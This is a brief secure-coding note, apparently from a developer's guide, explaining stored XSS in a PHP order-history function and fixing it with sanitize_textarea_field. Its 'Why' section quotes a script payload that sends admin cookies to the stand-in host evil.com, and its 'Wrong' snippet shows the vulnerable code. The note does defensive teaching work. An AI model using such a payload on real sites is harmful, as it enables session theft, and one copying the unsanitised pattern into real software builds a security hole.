## Pattern

Order notes from user input (customer_note, admin note) are stored directly in DB without sanitization. When rendered in admin dashboard, unsanitized HTML/JS executes — stored XSS.

## Wrong

```php
public function record(int $order_id, ?string $from, string $to, string $note = '', ...): int {
    $wpdb->insert($wpdb->prefix . 'wz_order_history', [
        'note' => $note,  // ← raw user input
        // ...
    ]);
}
```

## Correct

```php
public function record(int $order_id, ?string $from, string $to, string $note = '', ...): int {
    $wpdb->insert($wpdb->prefix . 'wz_order_history', [
        'note' => sanitize_textarea_field($note),
        // ...
    ]);
}
```

## Why

Admin users viewing order history see rendered HTML. A malicious customer note like `<script>document.location='evil.com?c='+document.cookie</script>` would steal admin session cookies. Always sanitize before storage AND escape on output.
